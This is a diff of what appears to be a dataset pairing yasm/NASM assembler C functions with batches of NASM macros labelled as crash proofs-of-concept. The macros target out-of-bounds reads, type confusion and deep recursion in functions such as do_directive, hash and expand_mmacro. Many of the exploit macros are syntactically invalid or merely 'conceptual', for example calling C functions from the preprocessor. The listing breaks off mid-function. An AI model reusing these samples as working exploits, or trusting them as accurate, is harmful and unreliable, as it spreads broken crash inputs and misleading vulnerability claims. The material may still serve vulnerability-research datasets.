+    ;; when the function tries to access lvalp->str_val[2].
+    ;; We assume that the function is called with tok = ""."", toklen = 1, zeropos = 0.
+    ;; This should lead to an allocation of str_val with insufficient length.
+    struc simulate_short_input
+        .byte 1 dup('.')
+    endstruc
+
+    ;; Trigger the parsing that would invoke handle_dot_label with the crafted input.
+    simulate_short_input
+%endmacro
+
+crash_handle_dot_label",vul24_4
+,"%macro crash_handle_dot_label 0
+    ; Trigger an out-of-bounds read by manipulating the token length and zero position
+    ; Assume zeropos is manipulated to be at the end of a short token, causing str_val to be shorter than 3 characters
+    struc trigger_dot_label
+        .byte 1, '.', 'a' ; a short token with a dot but less than 3 characters after the dot
+    endstruc
+
+    %assign %$zeropos 1 ; simulate the position just after the dot
+    %assign %$toklen 2  ; simulate the total length of the token as 2
+
+    ; Directly invoke the problematic function with controlled parameters
+    ; This is a conceptual call, as we cannot directly call C functions from NASM without proper setup
+    ; In a real scenario, this would be set up to pass the controlled 'tok', 'toklen', and 'zeropos' to 'handle_dot_label'
+    handle_dot_label .trigger_dot_label, %$zeropos, %$toklen, yasm_parser_nasm
+%endmacro
+
+crash_handle_dot_label",vul24_5
+,"%define simulate_input
+struc input_instance
+    .lvalp resb 8        ; Reserve space for pointer (simulate YYSTYPE*)
+    .tok resb 10         ; Reserve 10 bytes for token input
+    .toklen resd 1       ; Token length (4 bytes)
+    .zeropos resd 1      ; Zero position (4 bytes)
+    .parser_nasm resb 8  ; Reserve space for parser_nasm pointer
+endstruc
+
+section .data
+input db ""....@"", 5      ; Input token with potential out-of-bounds access
+parser_nasm db 0         ; Dummy parser_nasm structure
+
+section .bss
+instance resb input_instance_size
+
+section .text
+    mov [instance.input_instance.tok], offset input
+    mov dword [instance.input_instance.toklen], 5
+    mov dword [instance.input_instance.zeropos], 3  ; Set zeropos to trigger out-of-bounds
+    mov [instance.input_instance.parser_nasm], offset parser_nasm
+
+    ; Simulate calling handle_dot_label
+    ; Parameters (simulated): lvalp, tok, toklen, zeropos, parser_nasm
+    ; Directly manipulate memory to trigger the vulnerability
+    mov rdi, [instance.input_instance.lvalp]       ; Load address of lvalp
+    mov rsi, [instance.input_instance.tok]         ; Load address of tok
+    mov edx, [instance.input_instance.toklen]      ; Load toklen
+    mov ecx, [instance.input_instance.zeropos]     ; Load zeropos
+    mov r8, [instance.input_instance.parser_nasm]  ; Load parser_nasm
+
+    ; The following call is conceptual and represents the vulnerability trigger point
+    ; In practice, this would require an environment where handle_dot_label is callable
+    ; call handle_dot_label",vul24_6
+"do_directive(Token * tline) { int i, j, k, m, nparam, nolist; int offset; char *p, *mname, *newname; Include *inc; Context *ctx; Cond *cond; SMacro *smac, **smhead; MMacro *mmac; Token *t, *tt, *param_start, *macro_start, *last, **tptr, *origline; Line *l; struct tokenval tokval; yasm_expr *evalresult; MMacro *tmp_defining; yasm_intnum *intn; origline = tline; skip_white_(tline); if (!tok_type_(tline, TOK_PREPROC_ID) || (tline->text[1] == '%' || tline->text[1] == '$' || tline->text[1] == '!')) return NO_DIRECTIVE_FOUND; i = -1; j = elements(directives); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(tline->text, directives[k]); if (m == 0) { if (tasm_compatible_mode) { i = k; j = -2; } else if (k != PP_ARG && k != PP_LOCAL && k != PP_STACKSIZE) { i = k; j = -2; } break; } else if (m < 0) { j = k; } else i = k; } if (((istk->conds && !emitting(istk->conds->state)) || (istk->mstk && !istk->mstk->in_progress)) && !is_condition(i)) { return NO_DIRECTIVE_FOUND; } if (defining && i != PP_MACRO && i != PP_IMACRO && i != PP_ENDMACRO && i != PP_ENDM && (defining->name || (i != PP_ENDREP && i != PP_REP))) { return NO_DIRECTIVE_FOUND; } if (defining) { if (i == PP_MACRO || i == PP_IMACRO) { nested_mac_count++; return NO_DIRECTIVE_FOUND; } else if (nested_mac_count > 0) { if (i == PP_ENDMACRO) { nested_mac_count--; return NO_DIRECTIVE_FOUND; } } if (!defining->name) { if (i == PP_REP) { nested_rep_count++; return NO_DIRECTIVE_FOUND; } else if (nested_rep_count > 0) { if (i == PP_ENDREP) { nested_rep_count--; return NO_DIRECTIVE_FOUND; } } } } if (j != -2) { error(ERR_NONFATAL, \""unknown preprocessor directive `%s'\"", tline->text); return NO_DIRECTIVE_FOUND; } switch (i) { case PP_STACKSIZE: tline = tline->next; if (tline && tline->type == TOK_WHITESPACE) tline = tline->next; if (!tline || tline->type != TOK_ID) { error(ERR_NONFATAL, \""`%%stacksize' missing size parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } if (nasm_stricmp(tline->text, \""flat\"") == 0) { StackSize = 4; StackPointer = \""ebp\""; ArgOffset = 8; LocalOffset = 4; } else if (nasm_stricmp(tline->text, \""large\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 4; LocalOffset = 2; } else if (nasm_stricmp(tline->text, \""small\"") == 0) { StackSize = 2; StackPointer = \""bp\""; ArgOffset = 6; LocalOffset = 2; } else { error(ERR_NONFATAL, \""`%%stacksize' invalid size type\""); free_tlist(origline); return DIRECTIVE_FOUND; } free_tlist(origline); return DIRECTIVE_FOUND; case PP_INCLUDE: tline = tline->next; skip_white_(tline); if (!tline || (tline->type != TOK_STRING && tline->type != TOK_INTERNAL_STRING)) { error(ERR_NONFATAL, \""`%%include' expects a file name\""); free_tlist(origline); return DIRECTIVE_FOUND; } if (tline->next) error(ERR_WARNING, \""trailing garbage after `%%include' ignored\""); if (tline->type != TOK_INTERNAL_STRING) { p = tline->text + 1; p[strlen(p) - 1] = '\\0'; } else p = tline->text; expand_macros_in_string(&p); inc = nasm_malloc(sizeof(Include)); inc->next = istk; inc->conds = NULL; inc->fp = inc_fopen(p, &newname); nasm_free(p); inc->fname = nasm_src_set_fname(newname); inc->lineno = nasm_src_set_linnum(0); inc->lineinc = 1; inc->expansion = NULL; inc->mstk = NULL; istk = inc; list->uplevel(LIST_INCLUDE); free_tlist(origline); return DIRECTIVE_FOUND; case PP_STRLEN: tline = tline->next; skip_white_(tline); tline = expand_id(tline); if (!tline || (tline->type != TOK_ID && (tline->type != TOK_PREPROC_ID || tline->text[1] != '$'))) { error(ERR_NONFATAL, \""`%%strlen' expects a macro identifier as first parameter\""); free_tlist(origline); return DIRECTIVE_FOUND; } ctx = get_ctx(tline->text, FALSE); if (!ctx) smhead = &smacros[hash(tline->text)]; else smhead = &ctx->localmac; mname = tline->text; last = tline; tline = expand_smacro(tline->next); last->next = NULL; t = tline; while (tok_type_(t, TOK_WHITESPACE)) t = t->next; if (t->type != TOK_STRING) { error(ERR_NONFATAL, \""`%%strlen` requires string as second parameter\""); free_tlist(tline); free_tlist(origline); return DIRECTIVE_FOUND; } macro_start = nasm_malloc(sizeof(*macro_start)); macro_start->next = NULL; make_tok_num(macro_start, yasm_intnum_create_uint((unsigned long)(strlen(t->text) - 2))); macro_start->mac = NULL; if (smacro_defined(ctx, mname, 0, &smac, i == PP_STRLEN)) { if (!smac) error(ERR_WARNING, \""single-line macro `%s' defined both with and without parameters\"", mname); else { nasm_free(smac->name); free_tlist(smac->expansion); } } else { smac = nasm_malloc(sizeof(SMacro)); smac->next = *smhead; *smhead = smac; } smac->name = nasm_strdup(mname); smac->casesense = (i == PP_STRLEN); smac->nparam = 0; smac->level = 0; smac->expansion = macro_start; smac->in_progress = FALSE; free_tlist(tline); free_tlist(origline); return DIRECTIVE_FOUND;","%macro crash_strlen 0
+    ; Simulate a scenario where the token type is not TOK_STRING but is processed as if it were.
+    ; This will exploit the check `if (t->type != TOK_STRING)` in the `PP_STRLEN` directive handling.
+
+    ; Define a token that mimics a string but is actually a different type, causing a type confusion.
+    %define TOK_STRING 999  ; Redefine TOK_STRING to an unexpected value
+    %define TOK_ID 1        ; Ensure TOK_ID is defined as it should be
+
+    ; Create a fake token stream where the token type is TOK_ID but the content looks like a string.
+    %strcat %1 ""fake_string""  ; Use strcat to create a string-like token
+    %assign %1.type TOK_ID    ; Mislabel the token type to cause type confusion
+
+    ; Trigger the directive processing with the malformed token.
+    %strlen %1  ; This should trigger the processing of a string length directive with a malformed token
+%endmacro
+
+; Invoke the macro to simulate the exploit scenario.
+crash_strlen",vul25_1
+,"%macro malicious_macro 0
+    %define %$fake_string 12345
+%endmacro
+
+%macro trigger_strlen 0
+    %strlen %$fake_string
+%endmacro
+
+malicious_macro
+trigger_strlen",vul25_2
+,"%macro trigger_strlen_error 0
+    %define %$fake_string TOK_ID  ; Misleading macro, looks like a string but declared as TOK_ID
+    %assign %$token_type %$fake_string
+    %%invoke_strlen:
+        %strlen %$token_type ""fake_string""  ; Intentionally incorrect usage
+%endmacro
+
+trigger_strlen_error",vul25_3
+,"%macro malicious_macro 0
+    %define tricky_token `1234`  ; Initially looks like a number
+%endmacro
+
+%define %$local_var tricky_token
+%assign %$local_var %$local_var %+ %$local_var  ; Force an expansion that results in a non-string
+
+%macro trigger_crash 0
+    %%strlen %$local_var  ; This should expand and then be misinterpreted
+%endmacro
+
+trigger_crash",vul25_4
+,"%macro trigger_strlen_misuse 0
+    %define %$str ""dummy""
+    %assign %$type TOK_ID  ; Intentionally wrong type to bypass TOK_STRING check
+    %%start:
+        %strlen %$str  ; This should be a macro identifier but is misused here
+%endmacro
+
+trigger_strlen_misuse",vul25_5
+,"%macro malicious_macro 0
+    db ""This is not a string token"", 0
+%endmacro
+
+%define %$local_var malicious_macro
+%strlen %$local_var",vul25_6
+,"%macro malicious_macro 0
+    %define %$fake_string 12345
+%endmacro
+
+%macro trigger_strlen 0
+    %strlen %$fake_string
+%endmacro
+
+malicious_macro
+trigger_strlen",vul25_7
+,"%macro trigger_string_type_mismatch 0
+    struc fake_token
+        .type resb 1      ; Reserve space for token type
+        .text resb 10     ; Reserve space for token text
+    endstruc
+
+    section .data
+    fake_token_start:
+        db TOK_ID         ; Incorrect token type for PP_STRLEN
+        db 'fake', 0      ; Some text that is not a valid string for PP_STRLEN
+
+    %define tline fake_token_start
+
+    ; Simulate calling do_directive with a malformed token list
+    %xdefine PP_STRLEN 1   ; Assuming PP_STRLEN is defined as 1 for demonstration
+    %assign i PP_STRLEN
+    %ifidn i, PP_STRLEN
+        ; This block simulates the internal logic of do_directive handling PP_STRLEN
+        %if tline.type != TOK_STRING
+            db 0x00       ; Intentionally place an invalid operation to trigger a crash
+        %endif
+    %endif
+%endmacro
+
+trigger_string_type_mismatch",vul25_8
+,"%macro trigger_strlen_mismatch 0
+    %define strange_token `12345`  ; Define a token that is not a string
+    %strlen %$strange_token        ; Attempt to use %strlen on a non-string token
+%endmacro
+
+trigger_strlen_mismatch",vul25_9
+,"%macro tricky_macro 0
+    %define %$str ""dummy""
+    %xdefine %$str %1  ; Redefine to non-string
+%endmacro
+
+%tricky_macro 12345  ; Pass a number instead of a string
+
+%strlen %$str        ; This should pass the initial check but fail later",vul25_10
+"static int hash(char *s) { unsigned int h = 0; unsigned int i = 0; static const int multipliers[] = { 1, 3, 9, 27, 19, 26, 16, 17, 20, 29, 25, 13, 8, 24, 10, 30, 28, 22, 4, 12, 5, 15, 14, 11, 2, 6, 18, 23, 7, 21 }; while (*s) { h += multipliers[i] * (unsigned char)(toupper(*s)); s++; if (++i >= sizeof(multipliers) / sizeof(multipliers[0])) i = 0; } h %= NHASH; return h; }","%macro crash_hash_function 0
+    struc trigger_hash_overflow
+        .data resb 31 ; Reserve 31 bytes, one more than the multipliers array
+    endstruc
+
+    %assign i 0
+    %rep 31  ; Repeat 31 times to ensure we exceed the multipliers array length
+        db 'A'  ; Fill with 'A' to keep it simple and predictable
+        %rotate 1
+    %endrep
+    db 0  ; Null-terminate the string
+
+    %define test_string trigger_hash_overflow
+
+    ; Simulate calling the hash function with the overly long string
+    ; Normally, we would need to set up a call to the actual function, but since we're focusing on the PoC for crashing,
+    ; we assume here that the function will be called with 'test_string' as an argument.
+%endmacro
+
+crash_hash_function",vul26_1
+,"section .text
+%define long_string 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141
+
+%macro crash_hash 0
+    lea rdi, [long_string]
+    call hash
+%endmacro
+
+crash_hash",vul26_2
+,"%macro crash_hash 0
+    struc trigger_overflow
+        .data resb 1
+    endstruc
+
+    %assign %$index 31  ; Set index to one past the end of multipliers array
+    %define %$string ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""  ; 32 'A's to overflow 'i'
+
+    %rep 32  ; Repeat enough times to ensure 'i' wraps around improperly
+        db %$string
+    %endrep
+%endmacro
+
+crash_hash",vul26_3
+,"%macro crash_hash_function 0
+struc trigger_overflow
+    .data resb 40 ; Reserve 40 bytes, more than the length of multipliers array
+endstruc
+
+section .data
+    overflow_string db ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"", 0
+
+section .text
+    %assign i 0
+    %rep 40 ; Repeat to ensure we exceed the multipliers array
+        db overflow_string[i]
+        %assign i i+1
+    %endrep
+%endmacro
+
+crash_hash_function",vul26_4
+,"%macro crash_hash 0
+    ; Define a very long string without null termination
+    %assign %$i 0
+    %rep 40  ; More than the length of multipliers array
+        db 'A'
+        %assign %$i %$i+1
+    %endrep
+    ; No db 0 at the end, string is not null-terminated
+
+    ; Pass the string to a hypothetical function that uses hash
+    ; Assuming there's a function that takes a string and passes it to hash
+    ; This part is abstract, as we focus on the string setup
+%endmacro
+
+crash_hash",vul26_5
+"static void expr_item_copy(yasm_expr__item *dest, const yasm_expr__item *src) { dest->type = src->type; switch (src->type) { case YASM_EXPR_SYM: dest->data.sym = src->data.sym; break; case YASM_EXPR_PRECBC: dest->data.precbc = src->data.precbc; break; case YASM_EXPR_EXPR: dest->data.expn = yasm_expr__copy_except(src->data.expn, -1); break; case YASM_EXPR_INT: dest->data.intn = yasm_intnum_copy(src->data.intn); break; case YASM_EXPR_FLOAT: dest->data.flt = yasm_floatnum_copy(src->data.flt); break; case YASM_EXPR_REG: dest->data.reg = src->data.reg; break; case YASM_EXPR_SUBST: dest->data.subst = src->data.subst; break; default: break; } }","%macro create_deep_expr 1
+    %assign i 0
+    %rep 10000  ; Large number to ensure deep recursion
+        %if i == 0
+            %define expr (10)
+        %else
+            %define expr (expr + 10)
+        %endif
+        %assign i i+1
+    %endrep
+%endmacro
+
+%macro trigger_overflow 0
+    create_deep_expr 1
+    %struc test_expr
+        .type resb 1
+        .data resb 8  ; Assuming 64-bit pointer size
+    %endstruc
+
+    test_expr expr
+%endmacro
+
+trigger_overflow",vul27_1
+,"%macro create_deep_expr 1
+    %assign i 0
+    %rep %1
+        %if i == 0
+            %define expr (10)
+        %else
+            %define expr (expr + 10)
+        %endif
+        %assign i i+1
+    %endrep
+    expr
+%endmacro
+
+%define deep_expr create_deep_expr(10000)  ; Adjust the depth to increase the likelihood of a stack overflow
+
+section .text
+    ; Simulate the scenario where yasm_expr_copy is called
+    ; This is a conceptual representation and may need adjustments based on actual YASM internals
+    %define src deep_expr
+    %define dest %empty
+    %struc yasm_expr__item
+        .type resb 1
+        .data resb 8  ; Assuming 64-bit pointers
+    %endstruc
+
+    yasm_expr__item src
+    yasm_expr__item dest
+
+    ; Assuming yasm_expr_copy is a callable function within the context of this PoC
+    ; This line is conceptual and needs to be adapted to actual usage or testing environments
+    ; yasm_expr_copy dest, src",vul27_2
+,"%macro create_expr 0
+    struc expr
+        .type resb 1
+        .data resb 8  ; Reserve space for union data
+    endstruc
+
+    %assign expr_size expr_size + expr.size
+
+    %define expr1 expr
+    %define expr2 expr+expr_size
+%endmacro
+
+%macro trigger_expr_copy 0
+    create_expr
+
+    ; Simulate setting up an expression of type YASM_EXPR_EXPR
+    db YASM_EXPR_EXPR  ; expr1.type = YASM_EXPR_EXPR
+    dq expr2           ; expr1.data.expn points to expr2
+
+    db YASM_EXPR_INT   ; expr2.type = YASM_EXPR_INT
+    dq 0               ; expr2.data.intn = 0 (dummy integer)
+
+    ; This should trigger the recursive copy with an invalid index
+    ; Attempt to copy expr1 to expr2, which should recursively try to copy expr2 to itself
+    ; with an invalid index, potentially causing a memory corruption
+    %rep 1
+        mov eax, [expr1]
+        mov [expr2], eax
+    %endrep
+%endmacro
+
+trigger_expr_copy",vul27_3
+,"%macro create_deep_expr 1
+    %if %1 > 0
+        %define expr_%1 expr_%1-1 + expr_%1-1
+        create_deep_expr %1-1
+    %else
+        %define expr_0 1
+    %endif
+%endmacro
+
+%macro trigger_overflow 0
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8
+    endstruc
+
+    %assign DEPTH 1000
+    create_deep_expr DEPTH
+
+    segment .data
+    src_item: 
+        db YASM_EXPR_EXPR ; type
+        dq expr_DEPTH     ; data.expn
+
+    dest_item:
+        resb 9            ; Allocate space for dest yasm_expr__item
+
+    %define yasm_expr__copy_except(src, n) (src+n) ; Mock function to simulate recursion
+
+    ; Simulate the function call
+    mov rdi, dest_item  ; destination
+    mov rsi, src_item   ; source
+    call expr_item_copy
+%endmacro
+
+trigger_overflow",vul27_4
+,"%macro trigger_expr_copy_overflow 0
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8  ; Assuming 64-bit pointer size for simplicity
+    endstruc
+
+    %assign %$depth 10000  ; Large depth to potentially cause stack overflow
+    %rep %$depth
+        %define expr%1 [yasm_expr__item.type=YASM_EXPR_EXPR yasm_expr__item.data=expr%1+1]
+    %endrep
+
+    %define expr%$depth [yasm_expr__item.type=YASM_EXPR_INT yasm_expr__item.data=0]  ; Terminate the recursion
+
+    ; Simulate the call to yasm_expr_copy with a deeply nested expression
+    %define src expr0
+    %define dest expr_final
+    yasm_expr_copy dest, src
+%endmacro
+
+trigger_expr_copy_overflow",vul27_5
+,"%macro trigger_expr_copy 0
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8  ; Assuming 64-bit pointer size
+    endstruc
+
+    ; Simulate a recursive expression structure
+    %define expr_recursive %1
+    %assign %1 expr_recursive + yasm_expr__item.size
+
+    ; Allocate space for two expression items
+    section .bss
+    expr1 resb yasm_expr__item.size
+    expr2 resb yasm_expr__item.size
+
+    ; Setup a recursive expression in expr1
+    %define expr1_type (expr1 + yasm_expr__item.type)
+    %define expr1_data (expr1 + yasm_expr__item.data)
+    db YASM_EXPR_EXPR  ; Expression type
+    dq expr1           ; Point to itself, creating a loop
+
+    ; Setup a normal expression in expr2
+    %define expr2_type (expr2 + yasm_expr__item.type)
+    %define expr2_data (expr2 + yasm_expr__item.data)
+    db YASM_EXPR_INT   ; Integer type
+    dq 0               ; Some integer value
+
+    ; Trigger the copy, expecting it to handle the recursive structure
+    extern yasm_expr_copy
+    mov rdi, expr2     ; Destination
+    mov rsi, expr1     ; Source (recursive)
+    call yasm_expr_copy
+%endmacro
+
+trigger_expr_copy",vul27_6
+,"%macro create_deep_expr 1
+    %assign i 0
+    %rep %1
+        %if i == 0
+            struc expr_item
+                .type resb 1
+                .data resb 8  ; Assuming 64-bit pointers
+            endstruc
+
+            %define expr_base (expr_item.type)
+            %define expr_data (expr_item.data)
+
+            ;; Initialize base expression
+            db YASM_EXPR_EXPR  ; Expression type
+            dq expr_base       ; Point to itself to create a loop
+        %else
+            ;; Each iteration points to the previous expression, deepening the recursion
+            db YASM_EXPR_EXPR
+            dq expr_base - (i * expr_item_size)
+        %endif
+        %assign i i+1
+    %endrep
+%endmacro
+
+section .data
+    create_deep_expr 1000  ; Adjust the depth to trigger the overflow
+
+section .text
+    ;; Assuming yasm_expr_copy is callable and the addresses are known
+    ;; This is a conceptual call, actual addresses and calling convention must be adapted
+    extern yasm_expr_copy
+    lea rdi, [expr_base]  ; Destination
+    lea rsi, [expr_base]  ; Source (deeply nested expression)
+    call yasm_expr_copy",vul27_7
+,"%macro recursive_expr 1
+    %if %1 > 0
+        %assign next_level %1-1
+        recursive_expr next_level
+    %else
+        %error ""Triggering deep recursion""
+    %endif
+%endmacro
+
+%macro exploit 0
+    recursive_expr 1000  ; Adjust the depth to ensure it's sufficient to cause a stack overflow
+%endmacro
+
+exploit",vul27_8
+"static int expand_mmacro(Token * tline) { Token *startline = tline; Token *label = NULL; int dont_prepend = 0; Token **params, *t, *tt; MMacro *m; Line *l, *ll; int i, nparam; long *paramlen; t = tline; skip_white_(t); if (!tok_type_(t, TOK_ID) && !tok_type_(t, TOK_PREPROC_ID)) return 0; m = is_mmacro(t, &params); if (!m) { Token *last; label = last = t; t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; if (tok_is_(t, \"":\"")) { dont_prepend = 1; last = t, t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; } if (!tok_type_(t, TOK_ID) || (m = is_mmacro(t, &params)) == NULL) return 0; last->next = NULL; tline = t; } for (nparam = 0; params[nparam]; nparam++) ; paramlen = nparam ? nasm_malloc(nparam * sizeof(*paramlen)) : NULL; for (i = 0; params[i]; i++) { int brace = FALSE; int comma = (!m->plus || i < nparam - 1); t = params[i]; skip_white_(t); if (tok_is_(t, \""{\"")) t = t->next, brace = TRUE, comma = FALSE; params[i] = t; paramlen[i] = 0; while (t) { if (comma && t->type == TOK_OTHER && !strcmp(t->text, \"",\"")) break; if (comma && t->type == TOK_WHITESPACE && tok_is_(t->next, \"",\"")) break; if (brace && t->type == TOK_OTHER && !strcmp(t->text, \""}\"")) break; t = t->next; paramlen[i]++; } } ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = m; ll->first = NULL; istk->expansion = ll; m->in_progress = TRUE; m->params = params; m->iline = tline; m->nparam = nparam; m->rotate = 0; m->paramlen = paramlen; m->unique = unique++; m->lineno = 0; m->next_active = istk->mstk; istk->mstk = m; for (l = m->expansion; l; l = l->next) { Token **tail; ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; tail = &ll->first; for (t = l->first; t; t = t->next) { Token *x = t; if (t->type == TOK_PREPROC_ID && t->text[1] == '0' && t->text[2] == '0') { dont_prepend = -1; x = label; if (!x) continue; } tt = *tail = new_Token(NULL, x->type, x->text, 0); tail = &tt->next; } *tail = NULL; } if (label) { if (dont_prepend < 0) free_tlist(startline); else { ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; ll->first = startline; if (!dont_prepend) { while (label->next) label = label->next; label->next = tt = new_Token(NULL, TOK_OTHER, \"":\"", 0); } } } list->uplevel(m->nolist ? LIST_MACRO_NOLIST : LIST_MACRO); return 1; }","%macro trigger_preproc_id_mismatch 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
+    %assign %$mstk NULL
+    %assign %$expansion NULL
+    %assign %$params NULL
+    expand_mmacro %$token  ; Call the vulnerable function with the crafted token
+%endmacro
+
+trigger_preproc_id_mismatch",vul28_1
+,"%macro crash_expand_mmacro 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
+    %assign %$tline %$token
+    %strcat %$tline.next NULL  ; Simulate end of token list
+    expand_mmacro(%$tline)  ; Call the vulnerable function with the crafted token
+%endmacro
+
+crash_expand_mmacro",vul28_2
+,"%macro crash_yasm 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)
+    %assign %$t %$token
+    %rep 1
+        expand_mmacro(%$t)
+    %endrep
+%endmacro
+
+crash_yasm",vul28_3
+,"%macro crash_expand_mmacro 0
+    %define %$tline `new_Token(NULL, TOK_PREPROC_ID, ""00"", 0)`
+    %assign %$dont_prepend 0
+    %assign %$label NULL
+    %assign %$params NULL
+    %assign %$t %$tline
+    %assign %$tt NULL
+    %assign %$m NULL
+    %assign %$l NULL
+    %assign %$ll NULL
+    %assign %$i 0
+    %assign %$nparam 0
+    %assign %$paramlen NULL
+
+    ; Simulate the function call with controlled parameters
+    %xdefine expand_mmacro(%$tline)
+%endmacro
+
+crash_expand_mmacro",vul28_4
+,"%macro trigger_preproc_token_type_mismatch 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
+    %assign %$t %$token
+    %ifidn %$t.type, TOK_PREPROC_ID
+        %error ""Triggering memory corruption""
+    %endif
+%endmacro
+
+trigger_preproc_token_type_mismatch",vul28_5
+,"%macro crash_expand_mmacro 0
+    %define %$tline `new_Token(NULL, TOK_PREPROC_ID, ""00trigger"", 0)`
+    %assign %$params NULL
+    %assign %$m NULL
+    %assign %$istk NULL
+    %assign %$label NULL
+    %assign %$dont_prepend 0
+
+    ; Simulate the environment to trigger the specific condition
+    ; This token setup is crafted to pass initial checks and reach the vulnerable code block
+    %define %$t %$tline
+    %define %$t.next NULL
+    %define %$t.type TOK_PREPROC_ID
+    %define %$t.text ""00trigger""
+
+    ; Force the function to use these crafted tokens and parameters
+    expand_mmacro(%$tline)
+%endmacro
+
+crash_expand_mmacro",vul28_6
+,"%macro crash_expand_mmacro 0
+    %struc TOK_PREPROC_ID
+        .type resb 1
+        .text resb 1  ; Allocate only 1 byte for text, insufficient for the check in the function
+    %endstruc
+
+    %assign %$t new TOK_PREPROC_ID
+    %$t.type db 0x01  ; Set type to TOK_PREPROC_ID
+    %$t.text db 0x00  ; Only one byte, insufficient for '00' check
+
+    %define %$token_list %$t
+
+    ; Simulate calling expand_mmacro with the crafted token
+    expand_mmacro %$token_list
+%endmacro
+
+crash_expand_mmacro",vul28_7
+,"%macro trigger_preproc_id_mismatch 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with text ""0""
+    %assign %$t %$token
+    %ifid %$t
+        %error ""This should not happen if memory safety is enforced.""
+    %endif
+%endmacro
+
+trigger_preproc_id_mismatch",vul28_8
+,"%macro trigger_preproc_token_type_mismatch 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)  ; Create a token with insufficient length
+    %assign %$t %$token
+    %ifidn %$t.type, TOK_PREPROC_ID
+        %error ""Attempting to access out-of-bounds memory""
+    %endif
+%endmacro
+
+trigger_preproc_token_type_mismatch",vul28_9
+,"%macro crash_expand_mmacro 0
+    ;; Create a token that simulates a TOK_PREPROC_ID with a short text field
+    %define %$t new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)
+    
+    ;; Force the expand_mmacro function to process this token
+    ;; This should access t->text[1] and t->text[2], leading to out-of-bounds access
+    %assign %$result expand_mmacro(%$t)
+%endmacro
+
+crash_expand_mmacro",vul28_10
+"expand_smacro(Token * tline) { Token *t, *tt, *mstart, **tail, *thead; SMacro *head = NULL, *m; Token **params; int *paramsize; int nparam, sparam, brackets, rescan; Token *org_tline = tline; Context *ctx; char *mname; if (org_tline) { tline = new_Token(org_tline->next, org_tline->type, org_tline->text, 0); tline->mac = org_tline->mac; nasm_free(org_tline->text); org_tline->text = NULL; } again: tail = &thead; thead = NULL; while (tline) { if ((mname = tline->text)) { if (tline->type == TOK_ID || tline->type == TOK_PREPROC_ID) ctx = get_ctx(mname, TRUE); else ctx = NULL; if (!ctx) head = smacros[hash(mname)]; else head = ctx->localmac; for (m = head; m; m = m->next) if (!mstrcmp(m->name, mname, m->casesense)) break; if (m) { mstart = tline; params = NULL; paramsize = NULL; if (m->nparam == 0) { if (!m->expansion) { if (!strcmp(\""__FILE__\"", m->name)) { long num = 0; nasm_src_get(&num, &(tline->text)); nasm_quote(&(tline->text)); tline->type = TOK_STRING; continue; } if (!strcmp(\""__LINE__\"", m->name)) { nasm_free(tline->text); make_tok_num(tline, yasm_intnum_create_int(nasm_src_get_linnum())); continue; } tline = delete_Token(tline); continue; } } else { do { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; } while (tok_type_(tline, TOK_WHITESPACE)); if (!tok_is_(tline, \""(\"")) { tline = mstart; m = NULL; } else { int paren = 0; int white = 0; brackets = 0; nparam = 0; sparam = PARAM_DELTA; params = nasm_malloc(sparam * sizeof(Token *)); params[0] = tline->next; paramsize = nasm_malloc(sparam * sizeof(int)); paramsize[0] = 0; while (TRUE) { t = tline->next; while (tok_type_(t, TOK_SMAC_END)) { t->mac->in_progress = FALSE; t->text = NULL; t = tline->next = delete_Token(t); } tline = t; if (!tline) { error(ERR_NONFATAL, \""macro call expects terminating `)'\""); break; } if (tline->type == TOK_WHITESPACE && brackets <= 0) { if (paramsize[nparam]) white++; else params[nparam] = tline->next; continue; } if (tline->type == TOK_OTHER && tline->text[1] == 0) { char ch = tline->text[0]; if (ch == ',' && !paren && brackets <= 0) { if (++nparam >= sparam) { sparam += PARAM_DELTA; params = nasm_realloc(params, sparam * sizeof(Token *)); paramsize = nasm_realloc(paramsize, sparam * sizeof(int)); } params[nparam] = tline->next; paramsize[nparam] = 0; white = 0; continue; } if (ch == '{' && (brackets > 0 || (brackets == 0 && !paramsize[nparam]))) { if (!(brackets++)) { params[nparam] = tline->next; continue; } } if (ch == '}' && brackets > 0) if (--brackets == 0) { brackets = -1; continue; } if (ch == '(' && !brackets) paren++; if (ch == ')' && brackets <= 0) if (--paren < 0) break; } if (brackets < 0) { brackets = 0; error(ERR_NONFATAL, \""braces do not enclose all of macro parameter\""); } paramsize[nparam] += white + 1; white = 0; } nparam++; while (m && (m->nparam != nparam || mstrcmp(m->name, mname, m->casesense))) m = m->next; if (!m) error(ERR_WARNING | ERR_WARN_MNP, \""macro `%s' exists, but not taking %d parameters\"", mstart->text, nparam); } } if (m && m->in_progress) m = NULL; if (!m) nasm_free(params); nasm_free(paramsize); tline = mstart; } else { t = tline; if (t) { tline = t->next; t->next = NULL; } tt = new_Token(tline, TOK_SMAC_END, NULL, 0); tt->mac = m; m->in_progress = TRUE; tline = tt; for (t = 